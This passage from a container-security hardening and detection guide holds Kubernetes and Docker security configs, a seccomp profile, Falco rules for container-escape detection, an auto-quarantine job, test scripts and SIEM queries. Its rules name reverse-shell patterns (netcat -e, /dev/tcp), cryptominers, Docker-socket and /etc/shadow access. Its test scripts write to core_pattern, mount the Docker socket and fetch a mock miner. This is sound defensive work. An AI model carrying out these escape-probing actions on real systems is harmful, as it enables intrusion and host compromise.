          - NET_BIND_SERVICE  # Only capability needed for nginx
      
      # SELinux/AppArmor labels
      seLinuxOptions:
        level: "s0:c123,c456"
    
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
      requests:
        memory: "256Mi"
        cpu: "250m"
    
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: cache
      mountPath: /var/cache/nginx
    - name: run
      mountPath: /var/run
  
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory
      sizeLimit: 100Mi
  - name: cache
    emptyDir: {}
  - name: run
    emptyDir: {}

---
# DOCKER COMPOSE WITH CAPABILITY DROPPING

version: '3.8'

services:
  web:
    image: nginx:1.25-alpine
    
    # Drop all capabilities, add only needed ones
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    
    # Security options
    security_opt:
      - no-new-privileges:true
      - seccomp=/path/to/custom-seccomp.json
      - apparmor=docker-secure-strict
    
    # Read-only root filesystem
    read_only: true
    
    # Run as non-root user
    user: "1000:1000"
    
    # Temporary writable volumes
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=100m
      - /var/cache/nginx:rw,noexec,nosuid,size=50m
      - /var/run:rw,noexec,nosuid,size=10m
    
    # Resource limits
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
        reservations:
          cpus: '0.25'
          memory: 256M
    
    # Disable privileged mode
    privileged: false
    
    # PID limits to prevent fork bombs
    pids_limit: 100
    
    # Network
    networks:
      - app-network

networks:
  app-network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16

---
# CUSTOM SECCOMP PROFILE (Blocks dangerous syscalls)

# Save as: /etc/docker/seccomp/secure-profile.json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_AARCH64",
    "SCMP_ARCH_ARM"
  ],
  "syscalls": [
    {
      "names": [
        "accept",
        "accept4",
        "access",
        "bind",
        "brk",
        "chdir",
        "close",
        "connect",
        "dup",
        "dup2",
        "dup3",
        "epoll_create",
        "epoll_create1",
        "epoll_ctl",
        "epoll_wait",
        "exit",
        "exit_group",
        "fchdir",
        "fcntl",
        "fstat",
        "fstatfs",
        "futex",
        "getcwd",
        "getpid",
        "getuid",
        "getgid",
        "getsockname",
        "listen",
        "lseek",
        "mmap",
        "mprotect",
        "munmap",
        "open",
        "openat",
        "poll",
        "read",
        "readv",
        "recvfrom",
        "recvmsg",
        "rt_sigaction",
        "rt_sigprocmask",
        "rt_sigreturn",
        "sendmsg",
        "sendto",
        "setsockopt",
        "shutdown",
        "socket",
        "stat",
        "statfs",
        "write",
        "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": [
        "ptrace",
        "mount",
        "umount",
        "umount2",
        "unshare",
        "pivot_root",
        "chroot",
        "clone",
        "setns",
        "keyctl",
        "add_key",
        "request_key",
        "bpf",
        "kexec_load",
        "kexec_file_load",
        "init_module",
        "finit_module",
        "delete_module",
        "iopl",
        "ioperm",
        "swapon",
        "swapoff",
        "reboot",
        "sethostname",
        "setdomainname",
        "modify_ldt",
        "lookup_dcookie",
        "perf_event_open",
        "quotactl",
        "nfsservctl",
        "create_module",
        "get_kernel_syms",
        "query_module",
        "uselib",
        "_sysctl"
      ],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}

---
# DOCKER CLI WITH CAPABILITY DROPPING AND SECCOMP

#!/bin/bash
docker run -d \
  --name secure-nginx \
  \
  # Capability management
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  \
  # Security options
  --security-opt no-new-privileges:true \
  --security-opt seccomp=/etc/docker/seccomp/secure-profile.json \
  --security-opt apparmor=docker-secure-strict \
  \
  # Filesystem
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  --tmpfs /var/cache/nginx:rw,noexec,nosuid,size=50m \
  \
  # User
  --user 1000:1000 \
  \
  # Resource limits
  --pids-limit 100 \
  --memory 512m \
  --cpus 0.5 \
  --ulimit nofile=1024:2048 \
  \
  # Network (no host network)
  --network app-network \
  \
  nginx:1.25-alpine

# Verify capabilities are dropped
docker exec secure-nginx sh -c 'apk add --no-cache libcap && capsh --print'
# Should show: Current: = cap_net_bind_service+eip (only NET_BIND_SERVICE)

---
# KUBERNETES POD SECURITY STANDARDS (Restricted Profile)

apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted

---
# OPA GATEKEEPER POLICY TO BLOCK PRIVILEGED CONTAINERS

apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockprivileged
spec:
  crd:
    spec:
      names:
        kind: K8sBlockPrivileged
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sblockprivileged
        
        violation[{"msg": msg}] {
          container := input_containers[_]
          container.securityContext.privileged
          msg := sprintf("Privileged containers are not allowed: %v", [container.name])
        }
        
        violation[{"msg": msg}] {
          container := input_containers[_]
          has_dangerous_capability(container)
          msg := sprintf("Container %v has dangerous capability: %v", [container.name, container.securityContext.capabilities.add])
        }
        
        has_dangerous_capability(container) {
          dangerous := ["SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_OVERRIDE", "DAC_READ_SEARCH", "SYS_BOOT", "SYS_RAWIO", "NET_ADMIN"]
          container.securityContext.capabilities.add[_] == dangerous[_]
        }
        
        input_containers[c] {
          c := input.review.object.spec.containers[_]
        }
        
        input_containers[c] {
          c := input.review.object.spec.initContainers[_]
        }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockPrivileged
metadata:
  name: block-privileged-containers
spec:
  enforcementAction: deny
  match:
    kinds:
      - apiGroups: ["", "apps", "batch"]
        kinds: ["Pod", "Deployment", "StatefulSet", "DaemonSet", "Job", "CronJob"]
    namespaces:
      - production
      - staging

---
# TEST CAPABILITY RESTRICTIONS

#!/bin/bash
echo "Testing capability restrictions..."

# Test 1: Verify privileged container is blocked
if kubectl run test-priv --image=alpine --privileged=true -n production 2>&1 | grep -q "denied\|violation"; then
  echo "[PASS] Privileged containers are blocked"
else
  echo "[FAIL] Privileged containers are NOT blocked"
fi

# Test 2: Verify dangerous capabilities are blocked
kubectl apply -f - << EOF
apiVersion: v1
kind: Pod
metadata:
  name: test-sysadmin
  namespace: production
spec:
  containers:
  - name: test
    image: alpine
    securityContext:
      capabilities:
        add:
          - SYS_ADMIN
EOF

if kubectl get pod test-sysadmin -n production 2>&1 | grep -q "Error\|denied"; then
  echo "[PASS] Dangerous capabilities (SYS_ADMIN) are blocked"
else
  echo "[FAIL] Dangerous capabilities are NOT blocked"
  kubectl delete pod test-sysadmin -n production
fi

# Test 3: Verify seccomp blocks dangerous syscalls
docker run --rm --security-opt seccomp=/etc/docker/seccomp/secure-profile.json alpine sh -c 'unshare -r'
# Expected: unshare: unshare failed: Operation not permitted

echo "Testing complete."

nist_csf: PR.PT-3 - The principle of least functionality is incorporated
DE.CM-7 - Monitoring for unauthorized personnel, connections, devices, and software is performed
validation_steps: 1. Audit existing containers for capabilities: docker ps --format '{{.Names}}' | xargs -I {} docker inspect {} | jq '.[] | select(.HostConfig.Privileged == true) | .Name'
2. Verify Kubernetes Pod Security Standards enforced: kubectl get ns production -o yaml | grep pod-security
3. Test privileged container is blocked: kubectl run test --image=alpine --privileged=true (should fail)
4. Test dangerous capability blocked: deploy pod with CAP_SYS_ADMIN (should fail)
5. Check capabilities in running container: docker exec <container> capsh --print
6. Verify seccomp profile applied: docker inspect <container> | grep -A 5 SeccompProfile
7. Test dangerous syscall blocked: docker exec <container> unshare -r (should fail)
8. Deploy OPA Gatekeeper and verify constraints: kubectl get constrainttemplates
9. Test no-new-privileges flag: docker inspect <container> | grep NoNewPrivileges (should be true)
10. Monitor Falco alerts for capability abuse: kubectl logs -n falco daemonset/falco | grep -i capability

mitigations.title: Implement Runtime Security Monitoring with Falco and eBPF
mitigations.description: Deploy Falco runtime security platform to detect container escape attempts in real-time using eBPF (Extended Berkeley Packet Filter) kernel instrumentation. Falco monitors system calls, file access, network activity, and process execution for behavioral anomalies indicating container escape, privilege escalation, or exploitation attempts. Rules detect CVE exploitation patterns (runC overwrite, procfs manipulation), privileged container spawns, Docker socket abuse, kernel exploit indicators, and post-exploitation behaviors (reverse shells, cryptominers). Integrates with SIEM (Splunk, Elastic, Sentinel) for centralized alerting and automated incident response.

code_example.code:
# FALCO INSTALLATION ON KUBERNETES

# Method 1: Helm installation (recommended)
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=modern_ebpf \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set customRules.rules-container-escape.yaml="$(cat falco-container-escape-rules.yaml)"

---
# CUSTOM FALCO RULES FOR CONTAINER ESCAPE DETECTION
# Save as: falco-container-escape-rules.yaml

- rule: Container Escape via runC Exploit (CVE-2019-5736)
  desc: Detects attempts to exploit runC container escape vulnerability by overwriting /proc/self/exe
  condition: >
    open_write and
    container and
    (fd.name startswith /proc/self/exe or 
     fd.name startswith /proc/*/exe or
     fd.name contains /usr/bin/runc or
     fd.name contains /usr/bin/docker-runc) and
    not proc.name in (runc, docker-runc)
  output: >
    Potential runC container escape detected (CVE-2019-5736)
    (user=%user.name process=%proc.name file=%fd.name parent=%proc.pname 
     container_id=%container.id container_name=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, cve, mitre_privilege_escalation]

- rule: Container Escape via Privileged Container
  desc: Detects privileged containers which can easily escape to host
  condition: >
    container_started and
    container.privileged=true
  output: >
    Privileged container started (HIGH RISK for container escape)
    (user=%user.name container_id=%container.id container_name=%container.name 
     image=%container.image.repository:%container.image.tag namespace=%k8s.ns.name pod=%k8s.pod.name)
  priority: WARNING
  tags: [container, privileged, escape]

- rule: Container Escape via /proc/sys Manipulation
  desc: Detects attempts to write to /proc/sys paths used in container escape exploits
  condition: >
    open_write and
    container and
    (fd.name startswith /proc/sys/kernel/core_pattern or
     fd.name startswith /proc/sysrq-trigger or
     fd.name startswith /proc/sys/kernel/modprobe or
     fd.name startswith /sys/kernel/uevent_helper)
  output: >
    Container escape attempt via /proc/sys manipulation detected
    (user=%user.name process=%proc.name file=%fd.name parent=%proc.pname 
     container_id=%container.id container_name=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, kernel_exploit]

- rule: Container Escape via Docker Socket Mount
  desc: Detects access to Docker socket from within container
  condition: >
    open_read and
    container and
    fd.name startswith /var/run/docker.sock
  output: >
    Docker socket access from container detected (container escape vector)
    (user=%user.name process=%proc.name parent=%proc.pname cmdline=%proc.cmdline 
     container_id=%container.id container_name=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, escape, docker_socket]

- rule: Container Escape via Host Filesystem Mount
  desc: Detects access to suspicious host paths indicating host filesystem mount
  condition: >
    open_read and
    container and
    (fd.directory startswith /host or
     fd.directory startswith /hostfs or
     fd.name startswith /rootfs or
     (fd.name startswith /etc/shadow and not fd.name startswith /etc/shadow-) or
     fd.name startswith /etc/sudoers)
  output: >
    Host filesystem access from container detected (potential escape or hostPath mount)
    (user=%user.name process=%proc.name file=%fd.name parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, escape, host_mount]

- rule: Container Escape via nsenter
  desc: Detects nsenter usage to break out of container namespaces
  condition: >
    spawned_process and
    container and
    proc.name = nsenter
  output: >
    nsenter executed in container (namespace escape attempt)
    (user=%user.name process=%proc.name cmdline=%proc.cmdline parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, escape, nsenter]

- rule: Container Escape via Capability Abuse
  desc: Detects dangerous capability usage that could enable container escape
  condition: >
    spawned_process and
    container and
    (proc.name in (mount, umount, unshare, pivot_root, setns) or
     (proc.name in (capsh, getcap, setcap) and proc.cmdline contains sys_admin))
  output: >
    Dangerous capability abuse detected in container
    (user=%user.name process=%proc.name cmdline=%proc.cmdline parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: HIGH
  tags: [container, escape, capability]

- rule: Container Escape via Kernel Module Loading
  desc: Detects attempts to load kernel modules from container (requires CAP_SYS_MODULE)
  condition: >
    spawned_process and
    container and
    (proc.name in (insmod, modprobe, rmmod) or
     (proc.name = kmod and proc.cmdline contains insert))
  output: >
    Kernel module loading attempt from container
    (user=%user.name process=%proc.name cmdline=%proc.cmdline parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, escape, kernel_module]

- rule: Container Escape via BPF Exploitation
  desc: Detects BPF operations that could be used for kernel exploitation
  condition: >
    spawned_process and
    container and
    proc.name in (bpftool, bpf, tc) and
    proc.cmdline contains (prog, map, perf)
  output: >
    BPF operation detected in container (potential kernel exploit)
    (user=%user.name process=%proc.name cmdline=%proc.cmdline parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: HIGH
  tags: [container, escape, bpf, kernel_exploit]

- rule: Post-Escape Persistence via Cron
  desc: Detects persistence mechanisms after successful container escape
  condition: >
    open_write and
    container and
    (fd.name startswith /etc/cron or
     fd.name startswith /var/spool/cron or
     fd.name startswith /etc/crontab)
  output: >
    Cron persistence attempt from container (post-escape activity)
    (user=%user.name process=%proc.name file=%fd.name parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, persistence, post_escape]

- rule: Post-Escape Persistence via Systemd Service
  desc: Detects systemd service creation for persistence after escape
  condition: >
    open_write and
    container and
    (fd.directory startswith /etc/systemd/system or
     fd.directory startswith /lib/systemd/system or
     fd.directory startswith /usr/lib/systemd/system)
  output: >
    Systemd service creation from container (post-escape persistence)
    (user=%user.name process=%proc.name file=%fd.name parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, persistence, post_escape, systemd]

- rule: Container Escape Reverse Shell
  desc: Detects reverse shell creation after container escape
  condition: >
    spawned_process and
    container and
    ((proc.name in (nc, ncat, netcat, socat) and
      (proc.cmdline contains " -e " or proc.cmdline contains "exec")) or
     (proc.name in (bash, sh, dash, zsh) and
      proc.cmdline contains "/dev/tcp" and
      proc.cmdline contains ">&"))
  output: >
    Reverse shell detected from container (post-escape activity)
    (user=%user.name process=%proc.name cmdline=%proc.cmdline parent=%proc.pname 
     container_id=%container.id container_name=%container.name)
  priority: CRITICAL
  tags: [container, post_escape, reverse_shell, mitre_command_control]

- rule: Cryptominer Execution in Container
  desc: Detects cryptocurrency miner execution (common post-escape activity)
  condition: >
    spawned_process and
    container and
    (proc.name in (xmrig, minergate, cpuminer, cgminer, ethminer) or
     proc.cmdline contains (stratum+tcp, stratum+ssl, pool.minexmr, pool.supportxmr) or
     (proc.name in (curl, wget) and proc.cmdline contains (xmr, monero, cryptonight)))
  output: >
    Cryptominer detected in container
    (user=%user.name process=%proc.name cmdline=%proc.cmdline parent=%proc.pname 
     container_id=%container.id container_name=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, cryptominer, post_escape, mitre_impact]

# AUTOMATED INCIDENT RESPONSE
# Kubernetes CronJob to auto-remediate on critical alerts

apiVersion: batch/v1
kind: CronJob
metadata:
  name: falco-incident-response
  namespace: falco
spec:
  schedule: "*/5 * * * *"  # Every 5 minutes
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: falco-response
          containers:
          - name: response
            image: bitnami/kubectl:latest
            command:
            - /bin/bash
            - -c
            - |
              #!/bin/bash
              # Query Falco for CRITICAL alerts in last 5 minutes
              CRITICAL_ALERTS=$(kubectl logs -n falco daemonset/falco --since=5m | grep "Priority: CRITICAL")
              
              if [ -n "$CRITICAL_ALERTS" ]; then
                echo "CRITICAL Falco alerts detected. Initiating incident response..."
                
                # Extract container IDs from alerts
                CONTAINER_IDS=$(echo "$CRITICAL_ALERTS" | grep -oP 'container_id=\K[a-f0-9]+')
                
                for CID in $CONTAINER_IDS; do
                  echo "Processing container: $CID"
                  
                  # Get pod name from container ID
                  POD=$(kubectl get pods -A -o json | jq -r ".items[] | select(.status.containerStatuses[]?.containerID | contains(\"$CID\")) | .metadata.name")
                  NAMESPACE=$(kubectl get pods -A -o json | jq -r ".items[] | select(.status.containerStatuses[]?.containerID | contains(\"$CID\")) | .metadata.namespace")
                  
                  if [ -n "$POD" ] && [ -n "$NAMESPACE" ]; then
                    echo "Found pod: $NAMESPACE/$POD"
                    
                    # Quarantine pod by adding label
                    kubectl label pod "$POD" -n "$NAMESPACE" security-incident=quarantined --overwrite
                    
                    # Add network policy to block egress
                    cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine-$POD
  namespace: $NAMESPACE
spec:
  podSelector:
    matchLabels:
      security-incident: quarantined
  policyTypes:
  - Ingress
  - Egress
  egress: []  # Block all egress
  ingress: []  # Block all ingress
EOF
                    
                    # Capture forensic snapshot
                    kubectl exec "$POD" -n "$NAMESPACE" -- tar czf /tmp/forensics.tar.gz /proc /etc /var/log 2>/dev/null || true
                    kubectl cp "$NAMESPACE/$POD:/tmp/forensics.tar.gz" "/forensics/$POD-$(date +%s).tar.gz" || true
                    
                    # Send alert to security team
                    curl -X POST https://hooks.slack.com/YOUR/WEBHOOK \
                      -H 'Content-Type: application/json' \
                      -d "{\"text\":\"CRITICAL: Container escape detected in $NAMESPACE/$POD. Pod quarantined and forensics captured.\"}"
                    
                    echo "Incident response completed for $NAMESPACE/$POD"
                  fi
                done
              fi
          restartPolicy: Never

# FALCO TESTING AND VALIDATION

#!/bin/bash
# Save as: test-falco-container-escape-detection.sh

echo "Testing Falco container escape detection..."

# Test 1: Detect privileged container start
echo "[Test 1] Starting privileged container..."
kubectl run test-priv --image=alpine --privileged=true -- sleep 3600 2>/dev/null
sleep 5
if kubectl logs -n falco daemonset/falco --since=30s | grep -q "Privileged container started"; then
  echo "[PASS] Falco detected privileged container"
else
  echo "[FAIL] Falco did NOT detect privileged container"
fi
kubectl delete pod test-priv --force 2>/dev/null

# Test 2: Detect /proc/sys manipulation
echo "[Test 2] Testing /proc/sys write detection..."
kubectl run test-proc --image=alpine -- sh -c 'echo test > /proc/sys/kernel/core_pattern; sleep 30' 2>/dev/null
sleep 5
if kubectl logs -n falco daemonset/falco --since=30s | grep -q "proc/sys manipulation"; then
  echo "[PASS] Falco detected /proc/sys manipulation attempt"
else
  echo "[FAIL] Falco did NOT detect /proc/sys manipulation"
fi
kubectl delete pod test-proc --force 2>/dev/null

# Test 3: Detect Docker socket access
echo "[Test 3] Testing Docker socket access detection..."
kubectl run test-socket --image=alpine --overrides='{"spec":{"containers":[{"name":"test","image":"alpine","command":["sh","-c","ls /var/run/docker.sock; sleep 30"],"volumeMounts":[{"name":"docker","mountPath":"/var/run"}]}],"volumes":[{"name":"docker","hostPath":{"path":"/var/run"}}]}}' 2>/dev/null
sleep 5
if kubectl logs -n falco daemonset/falco --since=30s | grep -q "Docker socket access"; then
  echo "[PASS] Falco detected Docker socket access"
else
  echo "[FAIL] Falco did NOT detect Docker socket access"
fi
kubectl delete pod test-socket --force 2>/dev/null

# Test 4: Detect cryptominer
echo "[Test 4] Testing cryptominer detection..."
kubectl run test-miner --image=alpine -- sh -c 'wget -O /tmp/xmrig http://example.com/xmrig 2>/dev/null; sleep 30' 2>/dev/null
sleep 5
if kubectl logs -n falco daemonset/falco --since=30s | grep -q "Cryptominer detected"; then
  echo "[PASS] Falco detected cryptominer activity"
else
  echo "[FAIL] Falco did NOT detect cryptominer"
fi
kubectl delete pod test-miner --force 2>/dev/null

echo "Testing complete. Check Falco logs for full details:"
echo "kubectl logs -n falco daemonset/falco --tail=100"

indicators: Container processes accessing /proc/self/exe or host runC binary paths
Privileged container deployments (--privileged flag or CAP_SYS_ADMIN capability)
Container processes running as UID 0 (root) on host without user namespace remapping
nsenter, unshare, or setns execution inside containers
Kernel module loading attempts (insmod, modprobe) from containers
Unusual container restarts or runC/containerd process crashes
Cron or systemd service creation from within containers
Reverse shell connections from containers to external IPs
Cryptominer processes (xmrig, minergate) or connections to mining pools
High CPU/memory usage spikes in containers
Containers with dangerous capabilities: SYS_ADMIN, SYS_PTRACE, SYS_MODULE, DAC_OVERRIDE
BPF operations or eBPF program loading from containers

log_queries.query:
index=container sourcetype=docker:daemon OR sourcetype=linux_secure OR sourcetype=kubernetes:logs
| search (
    "privileged" OR "CAP_SYS_ADMIN" OR "CAP_SYS_PTRACE" OR "CAP_SYS_MODULE" OR
    "/proc/self/exe" OR "/proc/sys/kernel/core_pattern" OR "/proc/sysrq-trigger" OR
    "/var/run/docker.sock" OR "nsenter" OR "unshare" OR "setns" OR
    "xmrig" OR "minergate" OR "stratum+tcp" OR "cryptonight" OR
    "runc" AND ("overwrite" OR "exploit" OR "CVE-2019-5736" OR "CVE-2024-21626")
  )
| eval severity=case(
    match(_raw, "privileged.*true"), "critical",
    match(_raw, "CAP_SYS_ADMIN|CAP_SYS_PTRACE|CAP_SYS_MODULE"), "high",
    match(_raw, "proc/self/exe|core_pattern|sysrq-trigger|docker.sock"), "critical",
    match(_raw, "nsenter|unshare|setns"), "high",
    match(_raw, "xmrig|minergate|stratum"), "critical",
    match(_raw, "runc.*CVE"), "critical",
    1=1, "medium"
  )
| stats count by _time, host, container_name, severity, _raw
| where severity IN ("critical", "high")
| sort -_time
| table _time, host, container_name, severity, _raw

event.dataset: (docker.container OR linux.auditd OR kubernetes.audit) AND (
  container.security_context.privileged: true OR
  process.args: (*CAP_SYS_ADMIN* OR *CAP_SYS_PTRACE* OR *CAP_SYS_MODULE* OR *CAP_DAC_OVERRIDE*) OR
  file.path: (/proc/self/exe OR /proc/*/exe OR /proc/sys/kernel/core_pattern OR /proc/sysrq-trigger OR /sys/kernel/uevent_helper OR /var/run/docker.sock) OR
  process.name: (nsenter OR unshare OR setns OR insmod OR modprobe OR rmmod) OR
  process.name: runc AND (event.action: (exec OR write) OR process.args: *CVE*) OR
  process.name: (xmrig OR minergate OR cpuminer OR cgminer) OR
  destination.domain: (*pool* OR *mine* OR *crypto* OR *xmr* OR *monero*)
) AND container.id: *

// Detect container escape attempts across multiple indicators
let suspiciousCapabilities = dynamic(["CAP_SYS_ADMIN", "CAP_SYS_PTRACE", "CAP_SYS_MODULE", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_SYS_BOOT"]);
let dangerousPaths = dynamic(["/proc/self/exe", "/proc/sys/kernel/core_pattern", "/proc/sysrq-trigger", "/sys/kernel/uevent_helper", "/var/run/docker.sock"]);
let escapeTools = dynamic(["nsenter", "unshare", "setns", "insmod", "modprobe", "chroot"]);
let cryptominers = dynamic(["xmrig", "minergate", "cpuminer", "cgminer", "ethminer", "monero"]);
let miningPools = dynamic(["pool.minexmr", "pool.supportxmr", "stratum+tcp", "stratum+ssl", "crypto-pool"]);

ContainerLog
| union AuditLogs, Syslog, ContainerInventory
| where TimeGenerated > ago(24h)
| where (
    (LogEntry contains "privileged" and LogEntry contains "true") or
    LogEntry has_any (suspiciousCapabilities) or
    LogEntry has_any (dangerousPaths) or
    LogEntry has_any (escapeTools) or
    LogEntry has_any (cryptominers) or
    LogEntry has_any (miningPools) or
    (ProcessName == "runc" and (LogEntry contains "exec" or LogEntry contains "write" or LogEntry contains "CVE"))
  )
| extend Severity = case(
    LogEntry contains "privileged" or LogEntry has_any (dangerousPaths) or LogEntry contains "runc" and LogEntry contains "CVE", "Critical",
    LogEntry has_any (suspiciousCapabilities) or LogEntry has_any (escapeTools) or LogEntry has_any (cryptominers), "High",
    "Medium"
  )
| extend ThreatCategory = case(
    LogEntry has_any (dangerousPaths) or LogEntry has_any (escapeTools), "Container Escape",
    LogEntry contains "privileged" or LogEntry has_any (suspiciousCapabilities), "Privilege Escalation",
    LogEntry has_any (cryptominers) or LogEntry has_any (miningPools), "Cryptomining",
    LogEntry contains "runc" and LogEntry contains "CVE", "Vulnerability Exploitation",
    "Other"
  )
| project TimeGenerated, Computer, ContainerName, Namespace, Image, LogEntry, Severity, ThreatCategory
| where Severity in ("Critical", "High")
| summarize Count=count(), FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), SampleLogs=take_any(LogEntry, 3) by Computer, ContainerName, Namespace, Severity, ThreatCategory
| order by Severity desc, Count desc

fields @timestamp, @message, containerID, containerName, kubernetes.namespace_name, kubernetes.pod_name
| filter @message like /privileged|CAP_SYS_ADMIN|CAP_SYS_PTRACE|proc\/self\/exe|core_pattern|sysrq-trigger|docker\.sock|nsenter|xmrig|minergate|stratum/
| parse @message /(?<severity>CRITICAL|ERROR|WARNING)/
| stats count(*) as eventCount by containerName, kubernetes.namespace_name, severity, bin(5m)
| filter eventCount > 5 or severity = "CRITICAL"
| sort eventCount desc

resource.type="k8s_container" OR resource.type="gce_instance"
jsonPayload.message=~"(privileged|CAP_SYS_ADMIN|CAP_SYS_PTRACE|/proc/self/exe|core_pattern|sysrq-trigger|docker.sock|nsenter|unshare|xmrig|minergate|stratum)"
severity>="WARNING"
timestamp>="2026-02-03T00:00:00Z"
| group_by [resource.labels.container_name, resource.labels.namespace_name, severity], count(), window(5m)
| having count() > 5 OR severity="CRITICAL"
| order_by count() DESC
